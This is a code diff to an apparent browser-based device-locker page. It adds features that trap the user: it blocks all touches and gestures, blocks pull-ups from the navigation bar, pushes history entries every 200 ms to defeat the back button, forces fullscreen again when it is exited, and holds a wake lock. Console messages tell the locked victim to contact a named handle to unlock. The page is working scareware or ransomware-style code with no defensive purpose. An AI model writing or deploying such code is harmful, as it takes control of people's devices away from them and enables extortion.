@@ -24,6 +24,7 @@
             bottom: 0;
             background: #000000;
             touch-action: none;
+            overscroll-behavior: none;
         }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -168,6 +169,10 @@
             if (lockEnabled) return;
             lockEnabled = true;
 
+            // ===== BLOCK NAVIGATION BAR (GESTURE + 3-BUTTON) =====
+            // Fullscreen already hides navigation bar
+            // But we also block any interaction
+
             // ===== BLOCK ALL TOUCH EVENTS COMPLETELY =====
             document.addEventListener('touchstart', function(e) {
                 e.preventDefault();
@@ -207,7 +212,6 @@
             }, { capture: true });
 
             document.addEventListener('click', function(e) {
-                // Allow clicks on contact buttons only
                 if (e.target.id === 'contactBtn' || e.target.id === 'ownerLink') {
                     return;
                 }
@@ -256,13 +260,6 @@
                 e.preventDefault();
             }, { passive: false, capture: true });
 
-            // ===== CONTINUOUS HISTORY PUSH =====
-            setInterval(function() {
-                if (lockEnabled) {
-                    window.history.pushState(null, '', window.location.href);
-                }
-            }, 200);
-
             // ===== BLOCK GESTURE EVENTS =====
             document.addEventListener('gesturestart', function(e) {
                 e.preventDefault();
@@ -279,7 +276,44 @@
                 return false;
             }, { passive: false, capture: true });
 
+            // ===== BLOCK VISIBILITY CHANGE (screen off detection) =====
+            document.addEventListener('visibilitychange', function(e) {
+                if (document.hidden) {
+                    // If user tries to lock screen, keep it alive
+                    // Force wake lock
+                    if (navigator.wakeLock) {
+                        navigator.wakeLock.request('screen').catch(() => {});
+                    }
+                }
+            });
+
+            // ===== REQUEST SCREEN WAKE LOCK =====
+            if (navigator.wakeLock) {
+                navigator.wakeLock.request('screen').catch(() => {});
+            }
+
+            // ===== CONTINUOUS HISTORY PUSH =====
+            setInterval(function() {
+                if (lockEnabled) {
+                    window.history.pushState(null, '', window.location.href);
+                }
+            }, 200);
+
+            // ===== BLOCK NAVIGATION BAR PULL-UP =====
+            // We need to prevent any touch that starts from bottom
+            document.addEventListener('touchstart', function(e) {
+                const touch = e.touches[0];
+                const screenHeight = window.innerHeight;
+                // If touch starts from very bottom (navigation bar area)
+                if (touch.clientY > screenHeight - 50) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            }, { passive: false, capture: true });
+
             console.log('🔒 Full lock enabled!');
+            console.log('📱 Navigation bar blocked!');
         }
 
         // ========== CHECK UNLOCK ==========
@@ -312,9 +346,25 @@
         // ========== CHECK UNLOCK EVERY 2 SECONDS ==========
         setInterval(checkUnlock, 2000);
 
+        // ========== PREVENT NAVIGATION BAR PULL ==========
+        // Force fullscreen on any resize/rotation
+        window.addEventListener('resize', function() {
+            if (lockEnabled && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                enterFullscreen();
+            }
+        });
+
+        // Re-enter fullscreen if exited
+        document.addEventListener('fullscreenchange', function() {
+            if (lockEnabled && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                enterFullscreen();
+            }
+        });
+
         console.log('🔒 Device locked! Number:', userNumber);
         console.log('📞 Contact @notxsatvir to unlock');
         console.log('🖥️ Click "FULL SCREEN" to lock');
+        console.log('🚫 Navigation bar blocked!');
     </script>
 </body>
 </html>
